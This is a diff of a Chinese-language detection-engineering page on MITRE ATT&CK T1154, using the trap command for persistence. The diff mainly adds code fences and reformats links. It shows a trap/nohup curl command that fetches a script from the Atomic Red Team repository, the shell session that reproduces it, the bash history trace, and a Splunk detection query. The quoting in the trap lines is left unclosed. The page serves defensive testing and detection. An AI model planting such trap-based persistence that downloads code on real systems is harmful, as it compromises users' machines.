@@ -6,9 +6,11 @@
 
 ## 测试案例
 
+```bash
 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh # 脚本即使在退出后（ctrl + c）也会继续执行程序/脚本。
 
-trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh 
+trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh
+```
 
 关于trap、nohup命令的更多解释，你可以查看参考链接部分。
 
@@ -18,15 +20,20 @@ bash历史命令
 
 ## 测试复现
 
-icbc@icbc:/$ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh 
+```bash
+icbc@icbc:/$ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh
 
 > ^C
+```
 
 ## 测试留痕
 
+```bash
 icbc@icbc:/$ history
 
- 693  trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh 
+ 693  trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh
+
+```
 
 ## 检测规则/思路
 
@@ -34,8 +41,14 @@ index=linux sourcetype=bash_history "trap *" | table host,user_name,bash_command
 
 ## 参考推荐
 
-MITRE-ATT&CK-T1154:https://attack.mitre.org/techniques/T1154/
+MITRE-ATT&CK-T1154
 
-linux下trap命令详解：https://blog.csdn.net/carolzhang8406/article/details/46504415/
+<https://attack.mitre.org/techniques/T1154/>
 
-linux下nohup命令浅析：https://www.bbsmax.com/A/kjdw9606JN/
+linux下trap命令详解
+
+<https://blog.csdn.net/carolzhang8406/article/details/46504415/>
+
+linux下nohup命令浅析
+
+<https://www.bbsmax.com/A/kjdw9606JN/>
